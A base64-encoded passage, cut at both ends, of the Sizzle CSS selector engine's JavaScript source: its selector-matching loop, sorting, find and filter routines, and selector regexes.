vciArPSBwYXJ0cy5zaGlmdCgpOw0KDQogICAgICAgICAgICAgICAgc2V0ID0gcG9zUHJvY2Vzcyggc2VsZWN0b3IsIHNldCApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgLy8gVGFrZSBhIHNob3J0Y3V0IGFuZCBzZXQgdGhlIGNvbnRleHQgaWYgdGhlIHJvb3Qgc2VsZWN0b3IgaXMgYW4gSUQNCiAgICAgICAgLy8gKGJ1dCBub3QgaWYgaXQnbGwgYmUgZmFzdGVyIGlmIHRoZSBpbm5lciBzZWxlY3RvciBpcyBhbiBJRCkNCiAgICAgICAgaWYgKCAhc2VlZCAmJiBwYXJ0cy5sZW5ndGggPiAxICYmIGNvbnRleHQubm9kZVR5cGUgPT09IDkgJiYgIWNvbnRleHRYTUwgJiYNCiAgICAgICAgICAgICAgICBFeHByLm1hdGNoLklELnRlc3QocGFydHNbMF0pICYmICFFeHByLm1hdGNoLklELnRlc3QocGFydHNbcGFydHMubGVuZ3RoIC0gMV0pICkgew0KICAgICAgICAgICAgdmFyIHJldCA9IFNpenpsZS5maW5kKCBwYXJ0cy5zaGlmdCgpLCBjb250ZXh0LCBjb250ZXh0WE1MICk7DQogICAgICAgICAgICBjb250ZXh0ID0gcmV0LmV4cHIgPyBTaXp6bGUuZmlsdGVyKCByZXQuZXhwciwgcmV0LnNldCApWzBdIDogcmV0LnNldFswXTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmICggY29udGV4dCApIHsNCiAgICAgICAgICAgIHZhciByZXQgPSBzZWVkID8NCiAgICAgICAgICAgICAgICB7IGV4cHI6IHBhcnRzLnBvcCgpLCBzZXQ6IG1ha2VBcnJheShzZWVkKSB9IDoNCiAgICAgICAgICAgICAgICBTaXp6bGUuZmluZCggcGFydHMucG9wKCksIHBhcnRzLmxlbmd0aCA9PT0gMSAmJiAocGFydHNbMF0gPT09ICJ+IiB8fCBwYXJ0c1swXSA9PT0gIisiKSAmJiBjb250ZXh0LnBhcmVudE5vZGUgPyBjb250ZXh0LnBhcmVudE5vZGUgOiBjb250ZXh0LCBjb250ZXh0WE1MICk7DQogICAgICAgICAgICBzZXQgPSByZXQuZXhwciA/IFNpenpsZS5maWx0ZXIoIHJldC5leHByLCByZXQuc2V0ICkgOiByZXQuc2V0Ow0KDQogICAgICAgICAgICBpZiAoIHBhcnRzLmxlbmd0aCA+IDAgKSB7DQogICAgICAgICAgICAgICAgY2hlY2tTZXQgPSBtYWtlQXJyYXkoc2V0KTsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgcHJ1bmUgPSBmYWxzZTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgd2hpbGUgKCBwYXJ0cy5sZW5ndGggKSB7DQogICAgICAgICAgICAgICAgdmFyIGN1ciA9IHBhcnRzLnBvcCgpLCBwb3AgPSBjdXI7DQoNCiAgICAgICAgICAgICAgICBpZiAoICFFeHByLnJlbGF0aXZlWyBjdXIgXSApIHsNCiAgICAgICAgICAgICAgICAgICAgY3VyID0gIiI7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgcG9wID0gcGFydHMucG9wKCk7DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgaWYgKCBwb3AgPT0gbnVsbCApIHsNCiAgICAgICAgICAgICAgICAgICAgcG9wID0gY29udGV4dDsNCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICBFeHByLnJlbGF0aXZlWyBjdXIgXSggY2hlY2tTZXQsIHBvcCwgY29udGV4dFhNTCApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgY2hlY2tTZXQgPSBwYXJ0cyA9IFtdOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgaWYgKCAhY2hlY2tTZXQgKSB7DQogICAgICAgIGNoZWNrU2V0ID0gc2V0Ow0KICAgIH0NCg0KICAgIGlmICggIWNoZWNrU2V0ICkgew0KICAgICAgICB0aHJvdyAiU3ludGF4IGVycm9yLCB1bnJlY29nbml6ZWQgZXhwcmVzc2lvbjogIiArIChjdXIgfHwgc2VsZWN0b3IpOw0KICAgIH0NCg0KICAgIGlmICggdG9TdHJpbmcuY2FsbChjaGVja1NldCkgPT09ICJbb2JqZWN0IEFycmF5XSIgKSB7DQogICAgICAgIGlmICggIXBydW5lICkgew0KICAgICAgICAgICAgcmVzdWx0cy5wdXNoLmFwcGx5KCByZXN1bHRzLCBjaGVja1NldCApOw0KICAgICAgICB9IGVsc2UgaWYgKCBjb250ZXh0ICYmIGNvbnRleHQubm9kZVR5cGUgPT09IDEgKSB7DQogICAgICAgICAgICBmb3IgKCB2YXIgaSA9IDA7IGNoZWNrU2V0W2ldICE9IG51bGw7IGkrKyApIHsNCiAgICAgICAgICAgICAgICBpZiAoIGNoZWNrU2V0W2ldICYmIChjaGVja1NldFtpXSA9PT0gdHJ1ZSB8fCBjaGVja1NldFtpXS5ub2RlVHlwZSA9PT0gMSAmJiBjb250YWlucyhjb250ZXh0LCBjaGVja1NldFtpXSkpICkgew0KICAgICAgICAgICAgICAgICAgICByZXN1bHRzLnB1c2goIHNldFtpXSApOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGZvciAoIHZhciBpID0gMDsgY2hlY2tTZXRbaV0gIT0gbnVsbDsgaSsrICkgew0KICAgICAgICAgICAgICAgIGlmICggY2hlY2tTZXRbaV0gJiYgY2hlY2tTZXRbaV0ubm9kZVR5cGUgPT09IDEgKSB7DQogICAgICAgICAgICAgICAgICAgIHJlc3VsdHMucHVzaCggc2V0W2ldICk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgbWFrZUFycmF5KCBjaGVja1NldCwgcmVzdWx0cyApOw0KICAgIH0NCg0KICAgIGlmICggZXh0cmEgKSB7DQogICAgICAgIFNpenpsZSggZXh0cmEsIG9yaWdDb250ZXh0LCByZXN1bHRzLCBzZWVkICk7DQogICAgICAgIFNpenpsZS51bmlxdWVTb3J0KCByZXN1bHRzICk7DQogICAgfQ0KDQogICAgcmV0dXJuIHJlc3VsdHM7DQp9Ow0KDQpTaXp6bGUudW5pcXVlU29ydCA9IGZ1bmN0aW9uKHJlc3VsdHMpew0KICAgIGlmICggc29ydE9yZGVyICkgew0KICAgICAgICBoYXNEdXBsaWNhdGUgPSBiYXNlSGFzRHVwbGljYXRlOw0KICAgICAgICByZXN1bHRzLnNvcnQoc29ydE9yZGVyKTsNCg0KICAgICAgICBpZiAoIGhhc0R1cGxpY2F0ZSApIHsNCiAgICAgICAgICAgIGZvciAoIHZhciBpID0gMTsgaSA8IHJlc3VsdHMubGVuZ3RoOyBpKysgKSB7DQogICAgICAgICAgICAgICAgaWYgKCByZXN1bHRzW2ldID09PSByZXN1bHRzW2ktMV0gKSB7DQogICAgICAgICAgICAgICAgICAgIHJlc3VsdHMuc3BsaWNlKGktLSwgMSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgcmV0dXJuIHJlc3VsdHM7DQp9Ow0KDQpTaXp6bGUubWF0Y2hlcyA9IGZ1bmN0aW9uKGV4cHIsIHNldCl7DQogICAgcmV0dXJuIFNpenpsZShleHByLCBudWxsLCBudWxsLCBzZXQpOw0KfTsNCg0KU2l6emxlLmZpbmQgPSBmdW5jdGlvbihleHByLCBjb250ZXh0LCBpc1hNTCl7DQogICAgdmFyIHNldCwgbWF0Y2g7DQoNCiAgICBpZiAoICFleHByICkgew0KICAgICAgICByZXR1cm4gW107DQogICAgfQ0KDQogICAgZm9yICggdmFyIGkgPSAwLCBsID0gRXhwci5vcmRlci5sZW5ndGg7IGkgPCBsOyBpKysgKSB7DQogICAgICAgIHZhciB0eXBlID0gRXhwci5vcmRlcltpXSwgbWF0Y2g7DQogICAgICAgIA0KICAgICAgICBpZiAoIChtYXRjaCA9IEV4cHIubGVmdE1hdGNoWyB0eXBlIF0uZXhlYyggZXhwciApKSApIHsNCiAgICAgICAgICAgIHZhciBsZWZ0ID0gbWF0Y2hbMV07DQogICAgICAgICAgICBtYXRjaC5zcGxpY2UoMSwxKTsNCg0KICAgICAgICAgICAgaWYgKCBsZWZ0LnN1YnN0ciggbGVmdC5sZW5ndGggLSAxICkgIT09ICJcXCIgKSB7DQogICAgICAgICAgICAgICAgbWF0Y2hbMV0gPSAobWF0Y2hbMV0gfHwgIiIpLnJlcGxhY2UoL1xcL2csICIiKTsNCiAgICAgICAgICAgICAgICBzZXQgPSBFeHByLmZpbmRbIHR5cGUgXSggbWF0Y2gsIGNvbnRleHQsIGlzWE1MICk7DQogICAgICAgICAgICAgICAgaWYgKCBzZXQgIT0gbnVsbCApIHsNCiAgICAgICAgICAgICAgICAgICAgZXhwciA9IGV4cHIucmVwbGFjZSggRXhwci5tYXRjaFsgdHlwZSBdLCAiIiApOw0KICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBpZiAoICFzZXQgKSB7DQogICAgICAgIHNldCA9IGNvbnRleHQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoIioiKTsNCiAgICB9DQoNCiAgICByZXR1cm4ge3NldDogc2V0LCBleHByOiBleHByfTsNCn07DQoNClNpenpsZS5maWx0ZXIgPSBmdW5jdGlvbihleHByLCBzZXQsIGlucGxhY2UsIG5vdCl7DQogICAgdmFyIG9sZCA9IGV4cHIsIHJlc3VsdCA9IFtdLCBjdXJMb29wID0gc2V0LCBtYXRjaCwgYW55Rm91bmQsDQogICAgICAgIGlzWE1MRmlsdGVyID0gc2V0ICYmIHNldFswXSAmJiBpc1hNTChzZXRbMF0pOw0KDQogICAgd2hpbGUgKCBleHByICYmIHNldC5sZW5ndGggKSB7DQogICAgICAgIGZvciAoIHZhciB0eXBlIGluIEV4cHIuZmlsdGVyICkgew0KICAgICAgICAgICAgaWYgKCAobWF0Y2ggPSBFeHByLm1hdGNoWyB0eXBlIF0uZXhlYyggZXhwciApKSAhPSBudWxsICkgew0KICAgICAgICAgICAgICAgIHZhciBmaWx0ZXIgPSBFeHByLmZpbHRlclsgdHlwZSBdLCBmb3VuZCwgaXRlbTsNCiAgICAgICAgICAgICAgICBhbnlGb3VuZCA9IGZhbHNlOw0KDQogICAgICAgICAgICAgICAgaWYgKCBjdXJMb29wID09IHJlc3VsdCApIHsNCiAgICAgICAgICAgICAgICAgICAgcmVzdWx0ID0gW107DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgaWYgKCBFeHByLnByZUZpbHRlclsgdHlwZSBdICkgew0KICAgICAgICAgICAgICAgICAgICBtYXRjaCA9IEV4cHIucHJlRmlsdGVyWyB0eXBlIF0oIG1hdGNoLCBjdXJMb29wLCBpbnBsYWNlLCByZXN1bHQsIG5vdCwgaXNYTUxGaWx0ZXIgKTsNCg0KICAgICAgICAgICAgICAgICAgICBpZiAoICFtYXRjaCApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGFueUZvdW5kID0gZm91bmQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCBtYXRjaCA9PT0gdHJ1ZSApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgaWYgKCBtYXRjaCApIHsNCiAgICAgICAgICAgICAgICAgICAgZm9yICggdmFyIGkgPSAwOyAoaXRlbSA9IGN1ckxvb3BbaV0pICE9IG51bGw7IGkrKyApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICggaXRlbSApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3VuZCA9IGZpbHRlciggaXRlbSwgbWF0Y2gsIGksIGN1ckxvb3AgKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgcGFzcyA9IG5vdCBeICEhZm91bmQ7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIGlucGxhY2UgJiYgZm91bmQgIT0gbnVsbCApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCBwYXNzICkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYW55Rm91bmQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3VyTG9vcFtpXSA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICggcGFzcyApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzdWx0LnB1c2goIGl0ZW0gKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYW55Rm91bmQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIGlmICggZm91bmQgIT09IHVuZGVmaW5lZCApIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCAhaW5wbGFjZSApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGN1ckxvb3AgPSByZXN1bHQ7DQogICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICBleHByID0gZXhwci5yZXBsYWNlKCBFeHByLm1hdGNoWyB0eXBlIF0sICIiICk7DQoNCiAgICAgICAgICAgICAgICAgICAgaWYgKCAhYW55Rm91bmQgKSB7DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gW107DQogICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAvLyBJbXByb3BlciBleHByZXNzaW9uDQogICAgICAgIGlmICggZXhwciA9PSBvbGQgKSB7DQogICAgICAgICAgICBpZiAoIGFueUZvdW5kID09IG51bGwgKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgIlN5bnRheCBlcnJvciwgdW5yZWNvZ25pemVkIGV4cHJlc3Npb246ICIgKyBleHByOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIG9sZCA9IGV4cHI7DQogICAgfQ0KDQogICAgcmV0dXJuIGN1ckxvb3A7DQp9Ow0KDQovKiojQCsgQGlnbm9yZSAqLw0KdmFyIEV4cHIgPSBTaXp6bGUuc2VsZWN0b3JzID0gew0KICAgIG9yZGVyOiBbICJJRCIsICJOQU1FIiwgIlRBRyIgXSwNCiAgICBtYXRjaDogew0KICAgICAgICBJRDogLyMoKD86W1x3XHUwMGMwLVx1RkZGRi1dfFxcLikrKS8sDQogICAgICAgIENMQVNTOiAvXC4oKD86W1x3XHUwMGMwLVx1RkZGRi1dfFxcLikrKS8sDQogICAgICAgIE5BTUU6IC9cW25hbWU9WyciXSooKD86W1x3XHUwMGMwLVx1RkZGRi1dfFxcLikrKVsnIl0qXF0vLA0KICAgICAgICBBVFRSOiAvXFtccyooKD86W1x3XHUwMGMwLVx1RkZGRi1dfFxcLikrKVxzKig/OihcUz89KVxzKihbJyJdKikoLio/KVwzfClccypcXS8sDQogICAgICAgIFRBRzogL14oKD86W1x3XHUwMGMwLVx1RkZGRlwqLV18XFwuKSspLywNCiAgICAgICAgQ0hJTEQ6IC86KG9ubHl8bnRofGxhc3R8Zmlyc3QpLWNoaWxkKD86XCgoZXZlbnxvZGR8W1xkbistXSopXCkpPy8sDQogICAgICAgIFBPUzogLzoobnRofGVxfGd0fGx0fGZpcnN0fGxhc3R8ZXZlbnxvZGQpKD86XCgoXGQqKVwpKT8oPz1bXi1dfCQpLywNCiAgICAgICAgUFNFVURPOiAvOigoPzpbXHdcdTAwYzAtXHVGRkZGLV18XFwuKSspKD86XCgoWyciXSopKCg/OlwoW15cKV0rXCl8W15cMlwoXCldKikrKVwyXCkpPy8NCiAgICB9LA0KICAgIGxlZnRNYXRjaDoge30sDQogICAgYXR0ck1hcDogew0KICAgICAgICAiY2xhc3MiOiAiY2xhc3NOYW1lIiwNCiAgICAgICAgImZvciI6ICJodG1sRm9yIg0KICAgIH0sDQogICAgYXR0ckhhbmRsZTogew0KICAgICAgICBocmVmOiBmdW5jdGlvbihlbGVtKXsNCiAgICAgICAgICAgIHJldHVybiBlbGVtLmdldEF0dHJpYnV0ZSgiaHJlZiIpOw0KICAgICAgICB9DQogICAgfSwNCiAgICByZWxhdGl2ZTogew0KICAgICAgICAiKyI6IGZ1bmN0aW9uKGNoZWNrU2V0LCBwYXJ0LCBpc1hNTCl7DQogICAgICAgICAgICB2YXIgaXNQYXJ0U3RyID0gdHlwZW9mIHBhcnQgPT09ICJzdHJpbmciLA0KICAgICAgICAgICAgICAgIGlzVGFnID0gaXNQYXJ0U3RyICYmICEvXFcvLnRlc3QocGFydCksDQogICAgICAgICAgICAgICAgaXNQYXJ0U3RyTm90VGFnID0gaXNQYXJ0U3RyICYmICFpc1RhZzsNCg0KICAgICAgICAgICAgaWYgKCBpc1RhZyAmJiAhaXNYTUwgKSB7DQogICAgICAgICAgICAgICAgcGFydCA9IHBhcnQudG9VcHBlckNhc2UoKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgZm9yICggdmFyIGkgPSAwLCBsID0gY2hlY2tTZXQubGVuZ3RoLCBlbGVtOyBpIDwgbDsgaSsrICkgew0KICAgICAgICAgICAgICAgIGlmICggKGVsZW0gPSBjaGVja1NldFtpXSkgKSB7DQogICAgICAgICAgICAgICAgICAgIHdoaWxlICggKGVsZW0gPSBlbGVtLnByZXZpb3VzU2libGluZykgJiYgZWxlbS5ub2RlVHlwZSAhPT0gMSApIHt9DQoNCiAgICAgICAgICAgICAgICAgICAgY2hlY2tTZXRbaV0gPSBpc1BhcnRTdHJOb3RUYWcgfHwgZWxlbSAmJiBlbGVtLm5vZGVOYW1lID09PSBwYXJ0ID8NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsZW0gfHwgZmFsc2UgOg0KICAgICAgICAgICAgICAgICAgICAgICAgZWxlbSA9PT0gcGFydDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGlmICggaXNQYXJ0U3RyTm90VGFnICkgew0KICAgICAgICAgICAgICAgIFNpenpsZS5maWx0ZXIoIHBhcnQsIGNoZWNrU2V0LCB0cnVlICk7DQogICAgICAgICAgICB9DQogICAgICAgIH0sDQogICAgICAgICI+IjogZnVuY3Rpb24oY2hlY2tTZXQsIHBhcnQsIGlzWE1MKXsNCiAgICAgICAgICAgIHZhciBpc1BhcnRTdHIgPSB0eXBlb2YgcGFydCA9PT0gInN0cmluZyI7DQoNCiAgICAgICAgICAgIGlmICggaXNQYXJ0U3RyICYmICEvXFcvLnRlc3QocGFydCkgKSB7DQogICAgICAgICAgICAgICAgcGFydCA9IGlzWE1MID8gcGFydCA6IHBhcnQudG9VcHBlckNhc2UoKTsNCg0KICAgICAgICAgICAgICAgIGZvciAoIHZhciBpID0gMCwgbCA9IGNoZWNrU2V0Lmxlbmd0aDsgaSA8IGw7IGkrKyApIHsNCiAgICAgICAgICAgICAgICAgICAgdmFyIGVsZW0gPSBjaGVja1NldFtpXTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCBlbGVtICkgew0KICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHBhcmVudCA9IGVsZW0ucGFyZW50Tm9kZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNoZWNrU2V0W2ldID0gcGFyZW50Lm5vZGVOYW1lID09PSBwYXJ0ID8gcGFyZW50IDogZmFsc2U7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIGZvciAoIHZhciBpID0gMCwgbCA9IGNoZWNrU2V0Lmxlbmd0aDsgaSA8IGw7IGkrKyApIHsNCiAgICAgICAgICAgICAgICAgICAgdmFyIGVsZW0gPSBjaGVja1NldFtpXTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCBlbGVtICkgew0KICAgICAgICAgICAgICAgICAgICAgICAgY2hlY2tTZXRbaV0gPSBpc1BhcnRTdHIgPw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsZW0ucGFyZW50Tm9kZSA6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxlbS5wYXJlbnROb2RlID09PSBwYXJ0Ow0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgaWYgKCBpc1BhcnRTdHIgKSB7DQogICAgICAgICAgICAgICAgICAgIFNpenpsZS5maWx0ZXIoIHBhcnQsIGNoZWNrU2V0LCB0cnVlICk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9LA0KICAgICAgICAiIjogZnVuY3Rpb24oY2hlY2tTZXQsIHBhcnQsIGlzWE1MKXsNCiAgICAgICAgICAgIHZhciBkb25lTmFtZSA9IGRvbmUrKywgY2hlY2tGbiA9IGRpckNoZWNrOw0KDQogICAgICAgICAgICBpZiAoICEvXFcvLnRlc3QocGFydCkgKSB7DQogICAgICAgICAgICAgICAgdmFyIG5vZGVDaGVjayA9IHBhcnQgPSBpc1hNTCA/IHBhcnQgOiBwYXJ0LnRvVXBwZXJDYXNlKCk7DQogICAgICAgICAgICAgICAgY2hlY2tGbiA9IGRpck5vZGVDaGVjazsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgY2hlY2tGbigicGFyZW50Tm9kZSIsIHBhcnQsIGRvbmVOYW1lLCBjaGVja1NldCwgbm9kZUNoZWNrLCBpc1hNTCk7DQogICAgICAgIH0sDQogICAgICAgICJ+IjogZnVuY3Rpb24oY2hlY2tTZXQsIHBhcnQsIGlzWE1MKXsNCiAgICAgICAgICAgIHZhciBkb25lTmFtZSA9IGRvbmUrKywgY2hlY2tGbiA9IGRpckNoZWNrOw0KDQogICAgICAgICAgICBpZiAoIHR5cGVvZiBwYXJ0ID09PSAic3RyaW5nIiAmJiAhL1xXLy50ZXN0KHBhcnQpICkgew0KICAgICAgICAgICAgICAgIHZhciBub2RlQ2hlY2sgPSBwYXJ0ID0gaXNYTUwgPyBwYXJ0IDogcGFydC50b1VwcGVyQ2FzZSgpOw0KICAgICAgICAgICAgICAgIGNoZWNrRm4gPSBkaXJOb2RlQ2hlY2s7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGNoZWNrRm4oInByZXZpb3VzU2libGluZyIsIHBhcnQsIGRvbmVOYW1lLCBjaGVja1NldCwgbm9kZUNoZWNrLCBpc1hNTCk7DQogICAgICAgIH0NCiAgICB9LA0KICAgIGZpbmQ6IHsNCiAgICAgICAgSUQ6IGZ1bmN0aW9uKG1hdGNoLCBjb250ZXh0LCBpc1hNTCl7DQogICAgICAgICAgICBpZiAoIHR5cGVvZiBjb250ZXh0LmdldEVsZW1lbnRCeUlkICE9PSAidW5kZWZpbmVkIiAmJiAhaXNYTUwgKSB7DQogICAgICAgICAgICAgICAgdmFyIG0gPSBjb250ZXh0LmdldEVsZW1lbnRCeUlkKG1hdGNoWzFdKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gbSA/IFttXSA6IFtdOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9LA0KICAgICAgICBOQU1FOiBmdW5jdGlvbihtYXRjaCwgY29udGV4dCwgaXNYTUwpew0KICAgICAgICAgICAgaWYgKCB0eXBlb2YgY29udGV4dC5nZXRFbGVtZW50c0J5TmFtZSAhPT0gInVuZGVmaW5lZCIgKSB7DQogICAgICAgICAgICAgICAgdmFyIHJldCA9IFtdLCByZXN1bHRzID0gY29udGV4dC5nZXRFbGVtZW50c0J5TmFtZShtYXRjaFsxXSk7DQoNCiAgICAgICAgICAgICAgICBmb3IgKCB2YXIgaSA9IDAsIGwgPSByZXN1bHRzLmxlbmd0aDsgaSA8IGw7IGkrKyApIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCByZXN1bHRzW2ldLmdldEF0dHJpYnV0ZSgibmFtZSIpID09PSBtYXRjaFsxXSApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldC5wdXNoKCByZXN1bHRzW2ldICk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICByZXR1cm4gcmV0Lmxlbmd0aCA9PT0gMCA/IG51bGwgOiByZXQ7DQogICAgICAgICAgICB9DQogICAgICAgIH0sDQogICAgICAgIFRBRzogZnVuY3Rpb24obWF0Y2gsIGNvbnRleHQpew0KICAgICAgICAgICAgcmV0dXJuIGNvbnRleHQuZ2V0RWxlbWVudHNCeVRhZ05hbWUobWF0Y2hbMV0pOw0KICAgICAgICB9DQogICAgfSwNCiAgICBwcmVGaWx0ZXI6IHsNCiAgICAgICAgQ0xBU1M6IGZ1bmN0aW9uKG1hdGNoLCBjdXJMb29wLCBpbnBsYWNlLCByZXN1bHQsIG5vdCwgaXNYTUwpew0KICAgICAgICAgICAgbWF0Y2ggPSAiICIgKyBtYXRjaFsxXS5yZXBsYWNlKC9cXC9nLCAiIikgKyAiICI7DQoNCiAgICAgICAgICAgIGlmICggaXNYTUwgKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBmb3IgKCB2YXIgaSA9IDAsIGVsZW07IChlbGVtID0gY3VyTG9vcFtpXSkgIT0gbnVsbDsgaSsrICkgew0KICAgICAgICAgICAgICAgIGlmICggZWxlbSApIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCBub3QgXiAoZWxlbS5jbGFzc05hbWUgJiYgKCIgIiArIGVsZW0uY2xhc3NOYW1lICsgIiAiKS5pbmRleE9mKG1hdGNoKSA+PSAwKSApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICggIWlucGxhY2UgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc3VsdC5wdXNoKCBlbGVtICk7DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoIGlucGxhY2UgKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBjdXJMb29wW2ldID0gZmFsc2U7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfSwNCiAgICAgICAgSUQ6IGZ1bmN0aW9uKG1hdGNoKXsNCiAgICAgICAgICAgIHJldHVybiBtYXRjaFsxXS5yZXBsYWNlKC9cXC9nLCAiIik7DQogICAgICAgIH0sDQogICAgICAgIFRBRzogZnVuY3Rpb24obWF0Y2gsIGN1ckxvb3Apew0KICAgICAgICAgICAgZm9yICggdmFyIGkgPSAwOyBjdXJMb29wW2ldID09PSBmYWxzZTsgaSsrICl7fQ0KICAgICAgICAgICAgcmV0dXJuIGN1ckxvb3BbaV0gJiYgaXNYTUwoY3VyTG9vcFtpXSkgPyBtYXRjaFsxXSA6IG1hdGNoWzFdLnRvVXBwZXJDYXNlKCk7DQogICAgICAgIH0sDQogICAgICAgIENISUxEOiBmdW5jdGlvbihtYXRjaCl7DQogICAgICAgICAgICBpZiAoIG1hdGNoWzFdID09ICJudGgiICkgew0KICAgICAgICAgICAgICAgIC8vIHBhcnNlIGVxdWF0aW9ucyBsaWtlICdldmVuJywgJ29kZCcsICc1JywgJzJuJywgJzNuKzInLCAnNG4tMScsICctbis2Jw0KICAgICAgICAgICAgICAgIHZhciB0ZXN0ID0gLygtPykoXGQqKW4oKD86XCt8LSk/XGQqKS8uZXhlYygNCiAgICAgICAgICAgICAgICAgICAgbWF0Y2hbMl0gPT0gImV2ZW4iICYmICIybiIgfHwgbWF0Y2hbMl0gPT0gIm9kZCIgJiYgIjJuKzEiIHx8DQogICAgICAgICAgICAgICAgICAgICEvXEQvLnRlc3QoIG1hdGNoWzJdICkgJiYgIjBuKyIgKyBtYXRjaFsyXSB8fCBtYXRjaFsyXSk7DQoNCiAgICAgICAgICAgICAgICAvLyBjYWxjdWxhdGUgdGhlIG51bWJlcnMgKGZpcnN0KW4rKGxhc3QpIGluY2x1ZGluZyBpZiB0aGV5IGFyZSBuZWdhdGl2ZQ0KICAgICAgICAgICAgICAgIG1hdGNoWzJdID0gKHRlc3RbMV0gKyAodGVzdFsyXSB8fCAxKSkgLSAwOw0KICAgICAgICAgICAgICAgIG1hdGNoWzNdID0gdGVzdFszXSAtIDA7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC8vIFRPRE86IE1vdmUgdG8gbm9ybWFsIGNhY2hpbmcgc3lzdGVtDQogICAgICAgICAgICBtYXRjaFswXSA9IGRvbmUrKzsNCg0KICAgICAgICAgICAgcmV0dXJuIG1hdGNoOw0